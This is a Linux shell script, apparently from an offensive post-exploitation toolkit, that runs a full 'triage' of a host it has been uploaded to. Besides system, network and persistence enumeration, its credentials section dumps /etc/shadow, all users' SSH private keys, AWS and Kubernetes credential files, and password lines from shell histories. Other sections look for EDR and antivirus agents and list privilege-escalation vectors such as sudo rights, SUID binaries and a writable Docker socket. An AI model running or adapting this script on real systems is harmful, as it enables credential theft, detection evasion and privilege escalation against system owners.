#!/bin/sh
# gather/linux/triage.sh — Full triage runner (combines all gather playbooks)
# Requires: root for full coverage
# Read-only: YES (except hashdump which only reads files)
# Usage: Upload and run, or pipe: sh -c "$(cat triage.sh)"
#
# This is a meta-script that inlines all gather functionality.
# For selective gathering, use individual scripts instead.

echo "========================================"
echo "  BRJOTSKEL LINUX TRIAGE"
echo "  Host: $(hostname) | User: $(whoami)"
echo "  Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "========================================"
echo ""

# --- SYSTEM INFO ---
echo "================================================================"
echo "  SECTION: SYSTEM"
echo "================================================================"
echo "=== HOSTNAME / OS ==="
hostname; uname -a
cat /etc/os-release 2>/dev/null | head -5

echo ""
echo "=== CURRENT USER ==="
id; whoami

echo ""
echo "=== USERS WITH SHELLS ==="
grep -v "nologin\|/false" /etc/passwd 2>/dev/null

echo ""
echo "=== LOGGED IN ==="
w 2>/dev/null

# --- NETWORK ---
echo ""
echo "================================================================"
echo "  SECTION: NETWORK"
echo "================================================================"
echo "=== INTERFACES ==="
ip addr 2>/dev/null || ifconfig -a 2>/dev/null

echo ""
echo "=== ROUTES ==="
ip route 2>/dev/null || route -n 2>/dev/null

echo ""
echo "=== LISTENING ==="
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null

echo ""
echo "=== ESTABLISHED ==="
ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null

echo ""
echo "=== ARP ==="
ip neigh 2>/dev/null || arp -an 2>/dev/null

# --- CREDENTIALS ---
echo ""
echo "================================================================"
echo "  SECTION: CREDENTIALS"
echo "================================================================"
echo "=== SHADOW ==="
cat /etc/shadow 2>/dev/null || echo "[!] No access to /etc/shadow"

echo ""
echo "=== SSH PRIVATE KEYS ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -d "$d/.ssh" ] || continue
  for key in id_rsa id_ed25519 id_ecdsa id_dsa; do
    [ -f "$d/.ssh/$key" ] && echo "--- $d/.ssh/$key ---" && cat "$d/.ssh/$key" 2>/dev/null
  done
done

echo ""
echo "=== AUTHORIZED KEYS ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.ssh/authorized_keys" ] && echo "--- $d ---" && cat "$d/.ssh/authorized_keys" 2>/dev/null
done

echo ""
echo "=== AWS / CLOUD CREDS ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.aws/credentials" ] && echo "--- $d/.aws/credentials ---" && cat "$d/.aws/credentials" 2>/dev/null
  [ -f "$d/.kube/config" ] && echo "--- $d/.kube/config ---" && cat "$d/.kube/config" 2>/dev/null
done

echo ""
echo "=== HISTORY (passwords) ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  for f in .bash_history .zsh_history; do
    [ -f "$d/$f" ] || continue
    grep -inE "pass|secret|token|curl.*-u|mysql.*-p|sshpass" "$d/$f" 2>/dev/null | tail -10 && echo "  ^ $d/$f"
  done
done

# --- PERSISTENCE ---
echo ""
echo "================================================================"
echo "  SECTION: PERSISTENCE"
echo "================================================================"
echo "=== CRON ==="
cat /etc/crontab 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
cut -d: -f1 /etc/passwd 2>/dev/null | while IFS= read -r u; do
  out=$(crontab -l -u "$u" 2>/dev/null | grep -v "^#" | grep -v "^$")
  [ -n "$out" ] && echo "$u: $out"
done

echo ""
echo "=== SYSTEMD (custom) ==="
find /etc/systemd/system -name "*.service" -type f 2>/dev/null | while IFS= read -r f; do
  echo "--- $f ---"
  grep -E "^(ExecStart|ExecStartPre|User|Description)" "$f" 2>/dev/null
done

echo ""
echo "=== RC.LOCAL ==="
cat /etc/rc.local 2>/dev/null | grep -v "^#" | grep -v "^$"

# --- PROTECTIONS ---
echo ""
echo "================================================================"
echo "  SECTION: PROTECTIONS"
echo "================================================================"
echo "=== EDR/AV ==="
for path in /opt/CrowdStrike /opt/SentinelOne /opt/carbonblack /opt/wazuh /var/ossec /opt/splunkforwarder /opt/Tanium /etc/falco /opt/osquery; do
  [ -e "$path" ] && echo "FOUND: $path"
done
ps aux 2>/dev/null | grep -iE "falcon|sentinel|cbagent|ossec|wazuh|auditd|falco|osquery|elastic-agent|splunk" | grep -v grep

echo ""
echo "=== KERNEL HARDENING ==="
echo "ASLR: $(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)"
echo "ptrace_scope: $(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
getenforce 2>/dev/null || true

# --- PRIVESC ---
echo ""
echo "================================================================"
echo "  SECTION: PRIVESC VECTORS"
echo "================================================================"
echo "=== SUDO ==="
sudo -n -l 2>/dev/null || echo "[*] sudo requires password"

echo ""
echo "=== SUID ==="
find / -perm -4000 -type f 2>/dev/null | head -20

echo ""
echo "=== CAPABILITIES ==="
getcap -r / 2>/dev/null | head -15

echo ""
echo "=== DOCKER GROUP ==="
id 2>/dev/null | grep -q docker && echo "[+] IN DOCKER GROUP"
[ -w /var/run/docker.sock ] && echo "[+] DOCKER SOCKET WRITABLE"

echo ""
echo "========================================"
echo "  TRIAGE COMPLETE"
echo "========================================"
